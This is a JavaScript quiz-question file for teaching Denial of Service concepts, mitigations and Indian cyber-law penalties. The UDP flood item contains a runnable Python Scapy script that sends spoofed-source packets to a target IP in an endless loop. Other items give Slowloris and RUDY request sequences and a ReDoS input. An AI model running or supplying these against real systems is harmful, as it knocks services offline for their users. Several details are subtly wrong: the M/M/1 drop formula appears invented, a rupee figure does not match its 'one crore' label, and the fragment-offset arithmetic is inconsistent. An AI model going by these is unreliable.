const questions = [
  {
    question: "What is a Denial of Service (DoS) attack, and which pillar of the CIA Triad does it directly violate?",
    shortAnswer: "A DoS attack intentionally deprives legitimate users of access to a computer system, network service, or web application, directly violating the Availability pillar of the CIA triad.",
    explanation: "While Confidentiality breaches steal data and Integrity breaches alter data, a Denial of Service (DoS) attack aims to disrupt service operations. By exhausting system resources (CPU, RAM, bandwidth, connection state tables) or triggering software crashes, legitimate users in Kolkata are prevented from accessing banking portals, healthcare networks, or educational services.",
    hint: "Blocking the entrance to a store so legitimate customers cannot walk inside (Availability).",
    level: "basic",
    codeExample: `// CIA Triad Impact of DoS Attacks:
// Confidentiality : Intact (Data is not read or exfiltrated)
// Integrity       : Intact (Data is not altered or tampered with)
// Availability    : DESTROYED (Legitimate users receive HTTP 503 / Connection Timed Out!)`
  },
  {
    question: "What is the Fundamental Technical Difference between a Denial of Service (DoS) Attack and a Distributed Denial of Service (DDoS) Attack?",
    shortAnswer: "A DoS attack originates from a single source IP address/machine; a DDoS attack originates simultaneously from thousands or millions of globally distributed compromised machines (botnets).",
    explanation: "In a single-source DoS attack, an attacker in Salt Lake runs a high-volume tool from one server. The defender can easily block the single source IP at the perimeter firewall. In a DDoS attack, the attacker commands a global botnet of 500,000 infected IoT cameras, routers, and compromised hosts across 100 countries, making simple IP blacklist filtering completely ineffective.",
    hint: "One loud person screaming in a library (DoS) vs 10,000 people chanting simultaneously (DDoS).",
    level: "basic",
    codeExample: `// DoS vs DDoS Architecture:
// DoS  : [Attacker IP: 103.25.10.50] ➔ (100 Mbps Flood) ➔ [Victim Server] → (Easy to Block 1 IP!)
// DDoS : [Botnet (500,000 Distributed IPs)] ➔ (1.2 Tbps Flood) ➔ [Victim Server] → (Requires Scrubbing!)`
  },
  {
    question: "What are the 3 Primary Categories of Denial of Service (DoS) Attacks?",
    shortAnswer: "1. Volumetric / Bandwidth Attacks (saturating network pipes); 2. Protocol / State-Exhaustion Attacks (exhausting connection tables and firewall state); 3. Application Layer Attacks (exhausting CPU/RAM on web servers).",
    explanation: "1. Volumetric Attacks (UDP/ICMP floods) overwhelm network uplink capacity (Gbps/Tbps). 2. Protocol Attacks (SYN floods, Ping of Death) consume server operating system connection tables and load balancers. 3. Application Layer Attacks (HTTP floods, Slowloris) consume application memory and database connection pools with complex queries.",
    hint: "Flood the highway (Volumetric), jam the tollbooth gates (Protocol), overwhelm the customer service desk (Application).",
    level: "basic",
    codeExample: `// The 3 DoS Attack Dimensions:
// 1. Volumetric  : Measured in Bits Per Second (Gbps / Tbps) ➔ Saturates Network Uplink Bandwidth
// 2. Protocol    : Measured in Packets Per Second (PPS / Mpps) ➔ Exhausts OS State & Connection Tables
// 3. Application : Measured in Requests Per Second (RPS)       ➔ Exhausts Server CPU, RAM & SQL Pools`
  },
  {
    question: "What is 'State Table Exhaustion' in Stateful Firewalls and Load Balancers during a DoS Attack?",
    shortAnswer: "Overwhelming the stateful connection tracking table (`conntrack`) of a firewall or gateway with millions of bogus half-open connections until memory fills up, causing it to drop legitimate new traffic.",
    explanation: "Stateful firewalls track every active TCP/UDP connection in memory. An attacker sends thousands of spoofed packets per second. Each packet creates an entry in the firewall's state table. Once the table reaches its maximum capacity (e.g. 1,000,000 active connections), the firewall runs out of RAM and drops all subsequent legitimate connections, paralyzing the enterprise perimeter.",
    hint: "A receptionist's guest logbook completely filled with fake names so real visitors cannot be signed in.",
    level: "moderate",
    codeExample: `# Linux iptables / conntrack State Table Inspection:
# View current active tracked connections:
sysctl net.netfilter.nf_conntrack_count
# View maximum state table limit:
sysctl net.netfilter.nf_conntrack_max
# When count == max ➔ "nf_conntrack: table full, dropping packet!" (DoS Failure!)`
  },
  {
    question: "Under the Indian Information Technology Act 2000 Section 43(f), what constitutes Civil Liability for causing a Denial of Service?",
    shortAnswer: "Denying or causing the denial of access to any person authorized to access any computer, computer system or computer network carries compensation by way of damages up to ₹1 Crore.",
    explanation: "Section 43(f) explicitly governs DoS attacks: 'If any person without permission of the owner... (f) denies or causes the denial of access to any person authorized to access any computer system or computer network... he shall be liable to pay damages by way of compensation not exceeding one crore rupees to the person so affected.'",
    hint: "Section 43(f) covers Denial of Access with civil damages up to ₹1 Crore.",
    level: "basic",
    codeExample: `// Statutory Liability (IT Act Section 43(f)):
// Violation: Launching a DoS flood that takes down a Kolkata hospital's appointment booking server
// Compensation: Up to ₹1,00,00,00,000 (Rupees One Crore) per affected entity`
  },
  {
    question: "What was the 'Ping of Death' Attack, and how did it exploit IP Fragmentation to Crash Operating Systems?",
    shortAnswer: "Sending malformed ICMP echo request packets that, when reassembled, exceeded the maximum allowable IPv4 packet size of 65,535 bytes, causing buffer overflows and kernel panics in unpatched OS stacks.",
    explanation: "The maximum legal IPv4 packet size is 65,535 bytes. Attackers fragmented an oversized ICMP packet into smaller fragments whose offset sum totaled $> 65,535$ bytes. When the victim's operating system reassembled the fragments into memory, the buffer overflowed, corrupting adjacent kernel memory and causing an instant Blue Screen of Death (BSOD) or kernel panic.",
    hint: "Mailing a couch in 5 separate boxes that, when assembled, is too large for the living room and breaks the floorboards.",
    level: "expert",
    codeExample: `// Ping of Death IP Header Calculation:
// Fragment 1: Offset = 0, Length = 1500 bytes
// Fragment 2: Offset = 185 (1480 bytes), Length = 1500 bytes
// ...
// Final Fragment: Offset = 8100 (64800 bytes), Length = 1000 bytes
// Total Reassembled Size: 65,800 bytes > 65,535 byte IP Limit ➔ KERNEL PANIC!`
  },
  {
    question: "What is a 'Teardrop Attack', and how does it exploit Overlapping IP Packet Offsets?",
    shortAnswer: "Sending fragmented IP packets with deliberately overlapping offset fields; when the receiving TCP/IP stack attempts to reconstruct the packets, the overlap calculation causes a crash.",
    explanation: "In standard IP fragmentation, fragment offsets are sequential (e.g. 0-1499, 1500-2999). In a Teardrop DoS attack, the attacker sets Fragment 2's offset to begin at byte 1000 instead of 1500 (overlapping Fragment 1). The target operating system's reassembly code failed to handle negative fragment lengths, writing data out of bounds and crashing the kernel.",
    hint: "Torn puzzle pieces that physically overlap each other so you cannot fit them together without ripping the board.",
    level: "expert",
    codeExample: `// Teardrop Attack Fragment Offsets:
// Fragment 1 : Offset = 0   ➔ Bytes 0 to 1499
// Fragment 2 : Offset = 100 ➔ Bytes 800 to 2299 (OVERLAPS Fragment 1 by 700 bytes!)
// Target OS Calculation: Length = 2299 - 1499... (Unpatched stack handles negative length incorrectly ➔ CRASH!)`
  },
  {
    question: "Under the Indian Information Technology Act 2000 Section 66F, what constitutes the criminal penalty for DoS attacks on Critical Infrastructure classified as 'Cyber Terrorism'?",
    shortAnswer: "Denying access to authorized persons or damaging critical infrastructure to threaten the unity, integrity, security, or sovereignty of India is punishable with IMPRISONMENT FOR LIFE.",
    explanation: "Section 66F defines Cyber Terrorism. If an adversary launches a Denial of Service attack against the national power grid in Barrackpore, air traffic control switches, or atomic energy systems: 'Whoever commits or conspires to commit cyber terrorism shall be punishable with imprisonment which may extend to imprisonment for life.'",
    hint: "Section 66F prescribes Life Imprisonment for Cyber Terrorism against Critical Systems.",
    level: "basic",
    codeExample: `// Statutory Offense (IT Act Section 66F - Cyber Terrorism):
// Offense: Paralyzing 220kV power transmission control networks via coordinated DoS attacks
// Penalty: IMPRISONMENT FOR LIFE`
  },
  {
    question: "What is 'Bandwidth / Network Pipe Saturation' in Volumetric DoS Attacks?",
    shortAnswer: "Flooding an internet connection with more raw data traffic than the physical network link or router interface can carry (e.g. sending 10 Gbps of traffic down a 1 Gbps uplink).",
    explanation: "If an enterprise in Kolkata has a 1 Gbps fiber optic internet uplink, and an attacker floods the connection with 5 Gbps of raw UDP traffic, the internet service provider's edge router becomes completely congested. 80% of all incoming packets are dropped at the ISP upstream router before ever reaching the enterprise firewall, dropping all legitimate customer transactions.",
    hint: "Trying to pour a 10-liter bucket of water through a narrow funnel in 1 second.",
    level: "basic",
    codeExample: `// Pipe Saturation Calculation:
let enterprise_uplink_capacity = 1000.0; // Mbps (1 Gbps)
let incoming_dos_traffic_rate = 8500.0;  // Mbps (8.5 Gbps)
let packet_loss_ratio = (incoming_dos_traffic_rate - enterprise_uplink_capacity) / incoming_dos_traffic_rate;
// Packet Loss = 88.2% (9 out of every 10 legitimate packets are dropped at the ISP edge!)`
  },
  {
    question: "What is a 'Land Attack', and how did it exploit Identical Source and Destination IP / Port Addresses?",
    shortAnswer: "Sending a spoofed TCP SYN packet where the Source IP and Port are set to match the victim's own Destination IP and Port, causing the victim system to open an infinite connection loop with itself.",
    explanation: "In a Land Attack, the packet contains: `Source IP: 103.25.10.50, Source Port: 80` and `Dest IP: 103.25.10.50, Dest Port: 80`. When the victim machine receives the SYN packet, it attempts to reply to the source IP by sending a SYN-ACK back to itself, replying to its own SYN-ACK endlessly until system resources are exhausted and the operating system locks up.",
    hint: "Mailing a letter where both the sender and recipient addresses are your own house, causing the mail carrier to drop it in your mailbox forever.",
    level: "moderate",
    codeExample: `// Land Attack Packet Header Configuration:
IP_Header.src_ip = "103.25.10.50"; // Victim IP
IP_Header.dst_ip = "103.25.10.50"; // Victim IP (SAME!)
TCP_Header.src_port = 80;          // Victim Web Port
TCP_Header.dst_port = 80;          // Victim Web Port (SAME!)
// Result: Target system loops infinitely responding to its own SYN packets!`
  },
  {
    question: "Under the Digital Personal Data Protection (DPDP) Act 2023 Section 8(5) and Section 33, what are the corporate liabilities if a DoS attack results in an unmitigated personal data outage?",
    shortAnswer: "Failing to implement reasonable technical availability controls resulting in persistent data access failures or privacy safeguards collapse triggers penalties up to ₹250 Crores by the DPBI.",
    explanation: "Section 8(5) mandates that data fiduciaries must implement reasonable technical and organizational safeguards. If a healthcare provider or banking portal in West Bengal suffers prolonged service unavailability due to absent DoS resilience, preventing citizens from exercising their data rights during critical healthcare needs, the DPBI can impose penalties up to ₹250 Crores under Section 33.",
    hint: "Failing to implement availability controls triggers maximum national data privacy penalties.",
    level: "moderate",
    codeExample: `// DPDP Statutory Compliance Standard:
// Legal Section: Section 8(5) & Section 33 DPDP Act 2023
// Maximum Penalty: Up to ₹250,00,00,000 (Rupees 250 Crores) for negligent service availability controls`
  },
  {
    question: "What is 'CPU / System Resource Starvation' in Application Layer DoS Attacks?",
    shortAnswer: "Crafting specific complex requests (e.g. recursive regular expressions, unindexed SQL searches, intensive cryptographic handshakes) that force the server CPU to 100% utilization with minimal attacker bandwidth.",
    explanation: "An attacker sends 10 requests per second containing expensive operations: `SELECT * FROM audit_logs WHERE payload LIKE '%secret%a%b%c%';` (full table scan across 50,000,000 rows) or recursive regexes (ReDoS). Each query locks a database CPU thread for 30 seconds. With just 50 requests, all 32 CPU cores are locked at 100% utilization, denying service to all legitimate web visitors.",
    hint: "Asking a librarian to search through 1,000,000 unindexed books for a single misspelled word.",
    level: "expert",
    codeExample: `// ReDoS (Regular Expression Denial of Service) Payload:
// Vulnerable Regex Pattern : ^(a+)+$
// Malicious Input String   : "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!" (30 'a's followed by '!')
// Evaluation Complexity    : O(2^N) ➔ 1,073,741,824 backtracking steps ➔ CPU 100% Lock!`
  },
  {
    question: "Under CERT-In Mandatory Directions 2022, what is the mandatory incident reporting timeline for Denial of Service attacks targeting Indian organizations?",
    shortAnswer: "All organizations in India must report Denial of Service (DoS) and DDoS attacks affecting operations or critical systems to CERT-In within 6 HOURS of detection.",
    explanation: "Under Section 70B of the IT Act and CERT-In Direction No. 20(3)/2022-CERT-In, service providers, intermediaries, data centers, and corporate bodies must mandatorily report specified cyber security incidents (including DoS and DDoS attacks) to CERT-In within 6 hours of noticing them.",
    hint: "CERT-In requires mandatory incident reporting within a strict 6-hour window.",
    level: "basic",
    codeExample: `// Statutory SLA (CERT-In Mandatory Incident Reporting):
// Directive: Mandatory reporting of DoS service outages within 6 HOURS
// Mandate: Section 70B Information Technology Act 2000`
  },
  {
    question: "What is the 'Smurf Attack' Mechanism, and how does it use ICMP Broadcast Amplification?",
    shortAnswer: "Sending ICMP Echo Request (ping) packets with a spoofed Source IP set to the victim's address to the broadcast address of an unconfigured intermediary network, causing every host on the subnet to flood the victim with replies.",
    explanation: "The attacker sends 1 ping packet to `192.168.1.255` (broadcast) with `Source IP: 103.25.10.50` (victim). If there are 250 active workstations on that subnet, all 250 workstations simultaneously reply to the victim. The attacker achieves a 250x amplification factor. Modern routers defeat this by disabling directed broadcast forwarding (`no ip directed-broadcast`).",
    hint: "Shouting through a megaphone into a crowded stadium with someone else's name tag so everyone shouts back at that one person.",
    level: "moderate",
    codeExample: `// Smurf Attack Amplification Formula:
// Inbound Ping   : 1 ICMP Request to Broadcast Address (e.g. 10.0.0.255)
// Amplifiers     : 250 Subnet Hosts
// Outbound Flood : 250 ICMP Echo Replies directed at Victim IP (250x Amplification!)
// Router Fix     : no ip directed-broadcast`
  },
  {
    question: "How does the 'Fraggle Attack' differ from the Smurf Attack?",
    shortAnswer: "Smurf uses ICMP Echo packets on network broadcasts; Fraggle uses UDP packets sent to UDP port 7 (Echo) or port 19 (Chargen) on broadcast networks to generate amplification loops.",
    explanation: "Fraggle is the UDP counterpart of the ICMP Smurf attack. Attackers send spoofed UDP packets to port 7 (Echo service) on a broadcast address. Every machine on the network replies with a UDP packet to the victim. If the victim also runs an echo service, an infinite packet loop is established between the victim and the amplifiers, saturating the network.",
    hint: "The UDP version of the Smurf broadcast attack.",
    level: "moderate",
    codeExample: `// Fraggle Attack UDP Loop:
// Attacker sends : UDP Packet to 10.0.0.255:7 (Echo) with Source IP = Victim:7
// Intermediaries : All respond to Victim:7
// Victim         : Responds back to Intermediaries:7 ➔ INFINITE BANDWIDTH FLOOD LOOP!`
  },
  {
    question: "Under the Indian IT Act Section 66, what constitutes the criminal penalty for launching a Denial of Service attack against corporate computer systems?",
    shortAnswer: "Dishonestly or fraudulently disrupting or diminishing the utility of computer systems carries imprisonment up to 3 years and fines up to ₹5 Lakhs.",
    explanation: "Section 66 criminalizes fraudulent computer disruption: 'If any person, dishonestly or fraudulently, does any act referred to in section 43... he shall be punishable with imprisonment for a term which may extend to three years or with fine which may extend to five lakh rupees, or with both.' DoS perpetrators in West Bengal are prosecuted under Section 66.",
    hint: "Section 66 provides up to 3 years imprisonment and ₹5 Lakh fine for fraudulent computer disruption.",
    level: "basic",
    codeExample: `// Statutory Penalty (IT Act Section 66):
    // Offense: Intentionally launching a DoS attack to disrupt an online examination portal
    // Penalty: Up to 3 Years Imprisonment + Fine up to ₹5,00,000`
  },
  {
    question: "What is 'Memory Leak / Buffer Starvation DoS' in Software Application Security?",

    shortAnswer: "Exploiting unmanaged memory allocation bugs in server software by repeatedly sending requests that allocate RAM without releasing it, eventually triggering an Out-Of-Memory (OOM) operating system crash.",

    explanation: "If a web application endpoint in Salt Lake allocates a 10MB memory buffer for every unauthenticated session but fails to call `free()` on connection close, an attacker opens 1,000 connections. The server consumes 10GB of RAM in 5 seconds. When RAM is exhausted, the Linux OS kernel's OOM killer terminates the core web server process (`kill -9 nginx`), taking the service offline.",

    hint: "Borrowing books from a library and never returning them until all the shelves are empty and the library has to close.",

    level: "expert",

    codeExample: `// C Vulnerable Memory Allocation Endpoint:
void handle_request(int client_socket) {
    char *buffer = malloc(10485760); // Allocates 10MB per connection
    read_data(client_socket, buffer);
    // BUG: Missing free(buffer)!
    // Result: 500 requests ➔ 5GB RAM Leak ➔ Kernel OOM Killer Terminates Server!
}`
  },
  {
    question: "Synthesize an enterprise-scale Fundamental Denial of Service (DoS) Defense Architecture.",
    shortAnswer: "A multi-layered defense combining Upstream ISP Rate Limiting, Stateful Connection Table Hardening (`conntrack`), Kernel TCP Stack Tuning (SYN Cookies, Short Timeouts), Next-Gen Firewalls with Anomaly Filters, and Application Resource Quotas.",
    explanation: "To achieve complete immunity against single-source and protocol DoS attacks: 1. Perimeter Tier: Upstream BGP Flowspec and ISP ACLs dropping volumetric floods before reaching enterprise uplinks. 2. Firewall Tier: Stateful inspection with high connection limits (`nf_conntrack_max = 2000000`) and embryonic connection drops. 3. OS Kernel Tier: Linux TCP stack tuning enabling SYN Cookies (`tcp_syncookies = 1`), reducing FIN/SYN timeouts. 4. Application Tier: Web Application Firewall (WAF) rate limiting per IP and query timeout caps.",
    hint: "Combine upstream ISP filters, conntrack table scaling, kernel TCP SYN cookies, and WAF rate limits.",
    level: "expert",
    codeExample: `// Master Fundamental DoS Defense Blueprint:
// 1. Upstream Layer : BGP Flowspec & ISP Rate Limiting (Filters pipe saturation)
// 2. Network Layer  : Linux Kernel Tuning (net.ipv4.tcp_syncookies=1, net.ipv4.tcp_max_syn_backlog=4096)
// 3. State Layer    : Firewall conntrack scaling (net.netfilter.nf_conntrack_max=2000000)
// 4. App Layer      : Nginx WAF Rate Limiting (limit_req zone=one rate=10r/s burst=20 nodelay)`
  },
  {
    question: "What is 'Blackhole Routing / Null0 Routing' in Emergency Volumetric DoS Mitigation?",
    shortAnswer: "Instructing border routers to immediately drop all incoming traffic destined for the targeted victim IP address into a virtual discard interface (`Null0`), protecting the rest of the network infrastructure from pipe saturation.",
    explanation: "When a single server in Kolkata receives a 50 Gbps flood that threatens to saturate the entire data center's 10 Gbps uplink, network engineers announce a BGP Blackhole route for the victim IP. Upstream ISP routers route all packets for that specific IP to `Null0` (discard). While the targeted IP goes offline, all other thousands of corporate servers on the subnet are saved from collapse.",
    hint: "Sacrificing one room to save the rest of the building from a raging flood.",
    level: "moderate",
    codeExample: `// Cisco IOS Blackhole Route Configuration:
ip route 103.25.10.50 255.255.255.255 Null0
// Result: All 50 Gbps of incoming attack traffic is dropped instantly in hardware without consuming router CPU!`
  },
  {
    question: "Under the Indian Penal Code Section 427, what constitutes 'Mischief' (Sabotage) via Denial of Service Attacks?",
    shortAnswer: "Intentionally causing damage or disruption to electronic property that diminishes its value or utility, punishable with imprisonment up to 2 years and fines.",
    explanation: "Section 425/427 IPC defines Mischief. When an attacker launches a DoS attack that shuts down an online e-commerce platform or examination server in West Bengal, they diminish the utility of electronic property. Section 427 provides up to 2 years imprisonment alongside IT Act cyber offenses.",
    hint: "IPC Section 427 covers Mischief and Property Damage with up to 2 years imprisonment.",
    level: "basic",
    codeExample: `// Statutory Penalty (Indian Penal Code Section 427):
// Offense: Intentionally crashing corporate web servers via DoS flooding (Mischief)
// Penalty: Imprisonment for a term up to 2 Years, or with Fine, or with both`
  },
  {
    question: "What is 'SYN Flood' in Protocol Denial of Service, and how does it exploit the TCP Three-Way Handshake?",
    shortAnswer: "Sending thousands of TCP SYN packets with spoofed source IPs and never responding with the final ACK, leaving the server's half-open connection queue (SYN Backlog) completely full so legitimate users cannot connect.",
    explanation: "TCP requires SYN ➔ SYN-ACK ➔ ACK. The attacker sends a SYN. The server allocates memory in its SYN Backlog and sends SYN-ACK to a fake IP. The server waits for the final ACK (75-second timeout). When thousands of SYN packets arrive, the SYN Backlog fills completely, causing the server to reject all legitimate TCP handshakes.",
    hint: "Calling a restaurant to order 100 pizzas for delivery to a fake address, tying up all their phone lines so real customers get a busy signal.",
    level: "basic",
    codeExample: `// TCP Three-Way Handshake Half-Open Queue:
// Attacker ➔ [SYN] ➔ Server allocates Transmission Control Block (TCB) in memory
// Server   ➔ [SYN-ACK] ➔ Sent to Fake Spoofed IP (No reply ever arrives!)
// Server Backlog Queue fills: [TCB1][TCB2]...[TCB_MAX] ➔ Subsequent legitimate SYNs DROPPED!`
  },
  {
    question: "How do 'TCP SYN Cookies' (RFC 4987) prevent SYN Flood DoS Attacks without Allocating Memory?",
    shortAnswer: "By encoding the connection state into the Initial Sequence Number (ISN) of the SYN-ACK packet using a cryptographic hash, eliminating memory allocation until the client returns a valid final ACK.",
    explanation: "With SYN Cookies enabled (`tcp_syncookies = 1`), when a SYN arrives, the server allocates ZERO memory in the backlog. It computes an ISN cookie: ISN = SHA-1(ClientIP, ClientPort, SecretKey) + t. It sends the SYN-ACK. If the client is legitimate, it returns an ACK with ISN + 1. The server verifies the cryptographic hash, and ONLY THEN allocates connection memory.",
    hint: "A cloakroom attendant who gives you a claim ticket stamped with a secret cryptographic code instead of storing your coat in a reserved locker before you arrive.",
    level: "expert",
    codeExample: `# Enable TCP SYN Cookies in Linux Kernel:
sysctl -w net.ipv4.tcp_syncookies=1
# Verification:
cat /proc/sys/net/ipv4/tcp_syncookies
# Result: 1 (Immune to SYN Backlog queue exhaustion!)`
  },
  {
    question: "What is 'Slowloris DoS', and how does it exhaust Web Server Connection Pools using Minimal Bandwidth?",
    shortAnswer: "Opening multiple HTTP connections to a web server and sending incomplete HTTP headers at extremely slow intervals (e.g. 1 header line every 15 seconds), holding all server worker threads open with almost zero bandwidth.",
    explanation: "Traditional HTTP servers (Apache prefork) allocate 1 worker thread per connection (e.g. max 256 threads). Slowloris sends `GET / HTTP/1.1\\r\\n` followed by `X-a: b\\r\\n` every 15 seconds, never sending the final `\\r\\n\\r\\n`. The server keeps the thread open waiting for the request to complete. With just 300 slow connections (under 5 KB/s bandwidth), all 256 Apache threads are exhausted, blocking all legitimate users.",
    hint: "Sitting down at a restaurant table, ordering one breadstick every 20 minutes, and refusing to leave so no other diners can have a table.",
    level: "expert",
    codeExample: `// Slowloris Header Sequence:
GET / HTTP/1.1\\r\\n
Host: kolkata-fintech.in\\r\\n
User-Agent: Mozilla/5.0...\\r\\n
X-Custom-Header-1: a\\r\\n
... (waits 15 seconds) ...
X-Custom-Header-2: b\\r\\n  <-- Never sends final \\r\\n\\r\\n! Holds connection open indefinitely!`
  },
  {
    question: "Under the Indian IT Act Section 70, what constitutes the penalty for launching a Denial of Service attack on 'Protected Systems' (Critical National Infrastructure)?",
    shortAnswer: "Securing unauthorized access or attempting to deny service to designated Protected Systems carries imprisonment up to 10 YEARS and severe fines.",
    explanation: "Section 70 of the IT Act governs Critical Information Infrastructure (e.g. power transmission in Barrackpore, financial settlement switches in Salt Lake). Launching a DoS attack that denies access to a designated protected system carries up to 10 years imprisonment under Section 70.",
    hint: "Section 70 carries up to 10 years imprisonment for DoS attacks on Protected Systems.",
    level: "basic",
    codeExample: `// Statutory Offense (IT Act Section 70):
// Offense: Launching a DoS flood against state power grid SCADA servers
// Penalty: Imprisonment for a term up to 10 YEARS, and shall also be liable to Fine`
  },
  {
    question: "What is 'HTTP POST Flood / R-U-Dead-Yet (RUDY) DoS'?",
    shortAnswer: "Submitting HTTP POST requests with a large `Content-Length` header (e.g. 1,000,000 bytes) and transmitting the body data at 1 byte every 10 seconds, tying up web server threads for hours.",
    explanation: "Similar to Slowloris, RUDY targets web forms. It issues `POST /submit-form HTTP/1.1` with `Content-Length: 1000000`. It then transmits 1 single byte every 10 seconds. The web server keeps the connection thread active waiting for the full 1MB payload. With 200 concurrent RUDY connections, all web server worker processes are occupied, denying service to real users.",
    hint: "Mailing a 1,000-page document by sending 1 single letter on a postcard every week.",
    level: "expert",
    codeExample: `// RUDY (R-U-Dead-Yet) Attack Header:
POST /feedback HTTP/1.1\\r\\n
Host: kolkata-fintech.in\\r\\n
Content-Length: 1000000\\r\\n
Content-Type: application/x-www-form-urlencoded\\r\\n
\\r\\n
a=1 (waits 10s) &b=2 (waits 10s) &c=3 ...`
  },
  {
    question: "How do 'Reverse Proxy Event-Driven Architectures' (e.g. Nginx / Node.js) Resist Slow-Rate DoS Attacks like Slowloris?",
    shortAnswer: "Event-driven asynchronous web servers use non-blocking I/O (epoll/kqueue) to handle tens of thousands of concurrent connections with a single worker thread, buffering headers asynchronously without tying up dedicated CPU threads.",
    explanation: "Apache prefork creates 1 OS process per connection (256 connections = 256 processes). Nginx uses an asynchronous event loop (`epoll`). A single Nginx worker handles 50,000 idle connections using minimal RAM (a few kilobytes per connection). When Slowloris sends slow headers, Nginx holds the connection in memory without blocking active request processing for legitimate users.",
    hint: "One fast juggling performer who can keep 1,000 balls in the air at once without needing 1,000 separate jugglers.",
    level: "expert",
    codeExample: `// Nginx Asynchronous Event-Driven Configuration:
events {
    worker_connections 65535; # Handles 65k connections per worker!
    use epoll;                # Linux high-performance non-blocking I/O
}
# Client header timeout drops slowloris connections after 10s:
client_header_timeout 10s;
client_body_timeout   10s;`
  },
  {
    question: "What is 'UDP Flood DoS', and why does UDP's Connectionless Nature make it a Preferred Volumetric Attack Protocol?",
    shortAnswer: "Flooding random destination ports with high-volume UDP datagrams; because UDP is stateless and requires no handshake, attackers can spoof Source IP addresses with zero overhead and generate massive bandwidth consumption.",
    explanation: "TCP requires a handshake that forces the attacker to receive replies (limiting spoofing). UDP is connectionless: an attacker sends raw UDP packets with forged source IPs. When the victim server receives a UDP packet on an unopened port, it must look up the port, determine no application is listening, and generate an ICMP Port Unreachable packet, consuming both CPU and bandwidth.",
    hint: "Throwing thousands of unaddressed postcards through a mail slot, forcing the post office to check each one and write 'Return to Sender'.",
    level: "basic",
    codeExample: `// Python Scapy UDP Flood Generator:
from scapy.all import *
import random

target_ip = "103.25.10.50"
while True:
    fake_ip = f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
    packet = IP(src=fake_ip, dst=target_ip)/UDP(dport=random.randint(1,65535))/Raw(load=b"X"*1400)
    send(packet, verbose=False)`
  },

  {
    question: "Under the Indian Penal Code Section 420, what constitutes Cheating and Dishonestly Inducing Delivery of Property via DoS Extortion?",
    shortAnswer: "Threatening to launch or maintain a DoS attack unless corporate executives pay an extortion ransom, punishable with imprisonment up to 7 years and fines.",
    explanation: "Section 420 IPC penalizes cheating and fraudulent extortion. Cybercriminals who flood a company's website with DoS traffic and demand payment in cryptocurrency to stop the attack are prosecuted under Section 420 alongside IT Act Section 66.",
    hint: "IPC Section 420 covers Cheating and Fraudulent Extortion for DoS ransom demands.",
    level: "basic",
    codeExample: `// Statutory Offense (Indian Penal Code Section 420):
// Offense: Demanding ₹25 Lakhs in cryptocurrency under threat of continuing a DoS attack
// Penalty: Imprisonment for a term up to 7 Years, and shall also be liable to Fine`
  },
  {
    question: "Synthesize the mathematical relationship between Legitimate Request Arrival Rate (λ_legit), Attack Traffic Arrival Rate (λ_attack), Server Service Processing Capacity (μ), and Request Drop Probability (P_drop) in an M/M/1 Queueing Model.",
    shortAnswer: "Request drop probability is modeled as P_drop = 1 - e^(- λ_attack / (μ - λ_legit)); when attack traffic λ_attack exceeds remaining server capacity (μ - λ_legit), service availability collapses to zero (100% request drop rate).",
    explanation: "In an M/M/1 queueing system, server service capacity is μ requests/sec and legitimate traffic is λ_legit. When an attacker injects λ_attack requests/sec, the total arrival rate is λ_total = λ_legit + λ_attack. When λ_total >= μ, queue length approaches infinity (L → ∞), buffer overflows occur, and request drop probability is: P_drop = 1 - e^(- λ_attack / (μ - λ_legit)). Enforcing upstream rate limiting and anycast load balancing keeps λ_total < μ, ensuring P_drop → 0.",
    hint: "Mathematical queueing theory formula proving that when attack traffic rate exceeds remaining service capacity, request drop probability reaches 100%.",
    level: "expert",
    codeExample: `// M/M/1 Queueing DoS Availability Calculation:
// Server Capacity (μ) = 1,000 req/s | Legitimate Traffic (λ_legit) = 200 req/s
// Attack Traffic (λ_attack) = 5,000 req/s
// Available Capacity = μ - λ_legit = 800 req/s
// Exponent = -5000 / 800 = -6.25 ➔ P_drop = 1 - e^(-6.25) = 99.81% (SERVICE COLLAPSED!)`
  }
];

export default questions;
